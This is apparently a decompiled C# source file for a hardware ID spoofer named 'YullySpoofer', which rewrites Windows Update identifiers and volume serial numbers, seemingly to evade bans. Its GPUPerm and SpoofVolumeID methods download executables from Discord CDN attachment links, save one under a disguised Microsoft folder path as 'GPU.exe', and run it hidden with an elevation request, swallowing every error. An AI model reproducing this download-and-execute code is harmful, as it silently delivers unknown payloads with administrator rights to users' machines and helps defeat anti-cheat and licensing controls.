using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Management;
using System.Net;
using System.Reflection;
using Microsoft.Win32;

namespace YullySpoofer;

internal class Driver
{
	private static Random random;

	public static string appdata;

	public static string fullpath;

	static Driver()
	{
		random = new Random();
		appdata = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
		fullpath = appdata + "\\temp\\";
	}

	public static void CleanV1()
	{
		try
		{
			string path = "C:\\Program Files\\Blade Group";
			if (!Directory.Exists(path))
			{
				Directory.CreateDirectory(path);
			}
			string path2 = "C:\\Program Files\\Blade Group\\Config";
			if (!Directory.Exists(path2))
			{
				Directory.CreateDirectory(path2);
			}
			string path3 = "C:\\Program Files\\Blade Group\\Shadow Control Panel";
			if (!Directory.Exists(path3))
			{
				Directory.CreateDirectory(path3);
			}
			string path4 = "C:\\Program Files\\Blade Group\\ShadowActivities";
			if (!Directory.Exists(path4))
			{
				Directory.CreateDirectory(path4);
			}
			string path5 = "C:\\Program Files\\Blade Group\\ShadowDumpWindowsDriver";
			if (!Directory.Exists(path5))
			{
				Directory.CreateDirectory(path5);
			}
			string path6 = "C:\\Program Files\\Blade Group\\ShadowInstaller";
			if (!Directory.Exists(path6))
			{
				Directory.CreateDirectory(path6);
			}
			string path7 = "C:\\Program Files\\Blade Group\\ShadowInstallerClone";
			if (!Directory.Exists(path7))
			{
				Directory.CreateDirectory(path7);
			}
			string path8 = "C:\\Program Files\\Blade Group\\ShadowManager";
			if (!Directory.Exists(path8))
			{
				Directory.CreateDirectory(path8);
			}
			string path9 = "C:\\Program Files\\Blade Group\\ShadowNvidiaDriver";
			if (!Directory.Exists(path9))
			{
				Directory.CreateDirectory(path9);
			}
			string path10 = "C:\\Program Files\\Blade Group\\ShadowOperator";
			if (!Directory.Exists(path10))
			{
				Directory.CreateDirectory(path10);
			}
			string path11 = "C:\\Program Files\\Blade Group\\ShadowProcessator";
			if (!Directory.Exists(path11))
			{
				Directory.CreateDirectory(path11);
			}
			string path12 = "C:\\Program Files\\Blade Group\\ShadowServicesWatcher";
			if (!Directory.Exists(path12))
			{
				Directory.CreateDirectory(path12);
			}
			string path13 = "C:\\Program Files\\Blade Group\\ShadowStreamer";
			if (!Directory.Exists(path13))
			{
				Directory.CreateDirectory(path13);
			}
			string path14 = "C:\\Program Files\\Blade Group\\ShadowSystemWatcher";
			if (!Directory.Exists(path14))
			{
				Directory.CreateDirectory(path14);
			}
			string path15 = "C:\\Program Files\\Blade Group\\ShadowUsbOverIp";
			if (!Directory.Exists(path15))
			{
				Directory.CreateDirectory(path15);
			}
			string path16 = "C:\\Program Files\\Blade Group\\ShadowVirtualAudio";
			if (!Directory.Exists(path16))
			{
				Directory.CreateDirectory(path16);
			}
			string path17 = "C:\\Program Files\\Blade Group\\ShadowVirtualGamepad";
			if (!Directory.Exists(path17))
			{
				Directory.CreateDirectory(path17);
			}
			string path18 = "C:\\Program Files\\Blade Group\\ShadowVirtualHid";
			if (!Directory.Exists(path18))
			{
				Directory.CreateDirectory(path18);
			}
			string path19 = "C:\\Program Files\\Blade Group\\ShadowVirtualStorage";
			if (!Directory.Exists(path19))
			{
				Directory.CreateDirectory(path19);
			}
		}
		catch (Exception)
		{
		}
	}

	public static void CleanV2()
	{
		try
		{
			string path = "C:\\Program Files (x86)\\Blade Group";
			if (!Directory.Exists(path))
			{
				Directory.CreateDirectory(path);
			}
			string path2 = "C:\\Program Files (x86)\\Blade Group\\Config";
			if (!Directory.Exists(path2))
			{
				Directory.CreateDirectory(path2);
			}
			string path3 = "C:\\Program Files (x86)\\Blade Group\\Shadow Control Panel";
			if (!Directory.Exists(path3))
			{
				Directory.CreateDirectory(path3);
			}
			string path4 = "C:\\Program Files (x86)\\Blade Group\\ShadowActivities";
			if (!Directory.Exists(path4))
			{
				Directory.CreateDirectory(path4);
			}
			string path5 = "C:\\Program Files (x86)\\Blade Group\\ShadowDumpWindowsDriver";
			if (!Directory.Exists(path5))
			{
				Directory.CreateDirectory(path5);
			}
			string path6 = "C:\\Program Files (x86)\\Blade Group\\ShadowInstaller";
			if (!Directory.Exists(path6))
			{
				Directory.CreateDirectory(path6);
			}
			string path7 = "C:\\Program Files (x86)\\Blade Group\\ShadowInstallerClone";
			if (!Directory.Exists(path7))
			{
				Directory.CreateDirectory(path7);
			}
			string path8 = "C:\\Program Files (x86)\\Blade Group\\ShadowManager";
			if (!Directory.Exists(path8))
			{
				Directory.CreateDirectory(path8);
			}
			string path9 = "C:\\Program Files (x86)\\Blade Group\\ShadowNvidiaDriver";
			if (!Directory.Exists(path9))
			{
				Directory.CreateDirectory(path9);
			}
			string path10 = "C:\\Program Files (x86)\\Blade Group\\ShadowOperator";
			if (!Directory.Exists(path10))
			{
				Directory.CreateDirectory(path10);
			}
			string path11 = "C:\\Program Files (x86)\\Blade Group\\ShadowProcessator";
			if (!Directory.Exists(path11))
			{
				Directory.CreateDirectory(path11);
			}
			string path12 = "C:\\Program Files (x86)\\Blade Group\\ShadowServicesWatcher";
			if (!Directory.Exists(path12))
			{
				Directory.CreateDirectory(path12);
			}
			string path13 = "C:\\Program Files (x86)\\Blade Group\\ShadowStreamer";
			if (!Directory.Exists(path13))
			{
				Directory.CreateDirectory(path13);
			}
			string path14 = "C:\\Program Files (x86)\\Blade Group\\ShadowSystemWatcher";
			if (!Directory.Exists(path14))
			{
				Directory.CreateDirectory(path14);
			}
			string path15 = "C:\\Program Files (x86)\\Blade Group\\ShadowUsbOverIp";
			if (!Directory.Exists(path15))
			{
				Directory.CreateDirectory(path15);
			}
			string path16 = "C:\\Program Files (x86)\\Blade Group\\ShadowVirtualAudio";
			if (!Directory.Exists(path16))
			{
				Directory.CreateDirectory(path16);
			}
			string path17 = "C:\\Program Files (x86)\\Blade Group\\ShadowVirtualGamepad";
			if (!Directory.Exists(path17))
			{
				Directory.CreateDirectory(path17);
			}
			string path18 = "C:\\Program Files (x86)\\Blade Group\\ShadowVirtualHid";
			if (!Directory.Exists(path18))
			{
				Directory.CreateDirectory(path18);
			}
			string path19 = "C:\\Program Files (x86)\\Blade Group\\ShadowVirtualStorage";
			if (!Directory.Exists(path19))
			{
				Directory.CreateDirectory(path19);
			}
		}
		catch (Exception)
		{
		}
	}

	public static void GPUPerm()
	{
		//IL_007a: Unknown result type (might be due to invalid IL or missing references)
		//IL_009c: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\WindowsUpdate\\", writable: true);
			registryKey.SetValue("ClientUUID", $"{{{Guid.NewGuid()}}}");
			registryKey.SetValue("ChipsetMatchID", $"{{{Guid.NewGuid()}}}");
			registryKey.SetValue("PersistenceIdentifier", $"{{{Guid.NewGuid()}}}");
			string text = "";
			ManagementObjectEnumerator enumerator = new ManagementObjectSearcher("SELECT * FROM Win32_DisplayConfiguration").Get().GetEnumerator();
			try
			{
				while (enumerator.MoveNext())
				{
					ManagementBaseObject current = enumerator.get_Current();
					PropertyDataEnumerator enumerator2 = ((ManagementBaseObject)(ManagementObject)current).get_Properties().GetEnumerator();
					try
					{
						while (enumerator2.MoveNext())
						{
							PropertyData current2 = enumerator2.get_Current();
							if (!(current2.get_Name() != "Description"))
							{
								text = current2.get_Value().ToString()!.ToUpper();
								if (!text.Contains("INTEL") && !text.Contains("AMD"))
								{
									text.Contains("NVIDIA");
								}
							}
						}
					}
					finally
					{
						if (enumerator2 is IDisposable disposable)
						{
							disposable.Dispose();
						}
					}
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
			string userName = Environment.UserName;
			string address = "https://cdn.discordapp.com/attachments/934301887354785852/934586414610395196/Usermode_Driver.exe";
			string fileName = "C:\\Users\\" + userName + "\\AppData\\Roaming\\Microsoft\\Windows\\GPU.exe";
			WebClient webClient = new WebClient();
			webClient.Headers.Add("user-agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; .NET CLR 1.0.3705;)");
			webClient.DownloadFile(address, fileName);
			Process process = new Process();
			process.StartInfo.FileName = "cmd.exe";
			process.StartInfo.RedirectStandardInput = true;
			process.StartInfo.RedirectStandardError = true;
			process.StartInfo.RedirectStandardOutput = true;
			process.StartInfo.UseShellExecute = false;
			process.StartInfo.CreateNoWindow = true;
			process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			process.StartInfo.Verb = "runas";
			process.StartInfo.FileName = fileName;
			process.Start();
		}
		catch (Exception)
		{
		}
	}

	public static string randomString(int length)
	{
		Random random = new Random();
		return new string((from s in Enumerable.Repeat("ABCDEF012345678F9IY75986172038YXCASAKSJDBSAMNXVB9", length)
			select s[random.Next(s.Length)]).ToArray());
	}

	public static void SpoofBios()
	{
	}

	public static async void SpoofVolumeID()
	{
		string pathRoot = Path.GetPathRoot(Assembly.GetEntryAssembly()!.Location);
		try
		{
			new WebClient().DownloadFile("https://cdn.discordapp.com/attachments/966093210399150151/972803050446127144/Volumeid.exe", pathRoot + "Volumeid.exe");
			DriveInfo[] drives = DriveInfo.GetDrives();
			for (int i = 0; i < drives.Length; i++)
			{
				Process process = new Process();
				process.StartInfo.FileName = "cmd.exe";
				process.StartInfo.CreateNoWindow = true;
				process.StartInfo.RedirectStandardInput = true;
				process.StartInfo.RedirectStandardOutput = true;
				process.StartInfo.UseShellExecute = false;
				process.Start();
				process.StandardInput.WriteLine("cd " + pathRoot);
				process.StandardInput.Flush();
				process.StandardInput.WriteLine("start Volumeid.exe");
				process.StandardInput.Flush();
				StreamWriter standardInput = process.StandardInput;
				string[] strArrays = new string[6]
				{
					"volumeid ",
					drives[i].Name.Substring(0, 2),
					" ",
					randomString(4),
					"-",
					randomString(4)
				};
				standardInput.WriteLine(string.Concat(strArrays));
				process.StandardInput.Flush();
				process.StandardInput.Close();
				process.WaitForExit();
				process.Kill();
			}
		}
		catch (Exception)
		{
		}
	}
}
